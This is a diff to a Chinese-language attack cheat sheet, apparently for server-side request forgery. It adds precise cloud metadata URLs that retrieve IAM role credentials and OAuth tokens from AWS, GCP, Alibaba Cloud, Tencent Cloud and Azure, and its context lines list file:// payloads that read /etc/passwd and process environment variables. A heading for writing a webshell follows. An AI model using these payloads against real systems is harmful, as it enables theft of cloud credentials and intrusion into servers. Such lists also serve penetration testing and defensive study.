@@ -21,11 +21,13 @@ file:///etc/passwd  file:///proc/self/environ
 file:///var/www/html/index.php
 ```
 
-## 云原数据节点
+## 云元数据攻击（获取临时凭据）
 ```
-AWS:    http://169.254.169.254/latest/meta-data/
-GCP:    http://metadata.google.internal/computeMetadata/v1/
-阿里云: http://100.100.100.200/latest/meta-data/
+AWS:    http://169.254.169.254/latest/meta-data/iam/security-credentials/角色名
+GCP:    http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+阿里云: http://100.100.100.200/latest/meta-data/ram/security-credentials/角色名
+腾讯云: http://metadata.tencentyun.com/latest/meta-data/cvm/security-credentials/
+Azure:  http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
 ```
 
 ## 写入 Webshell
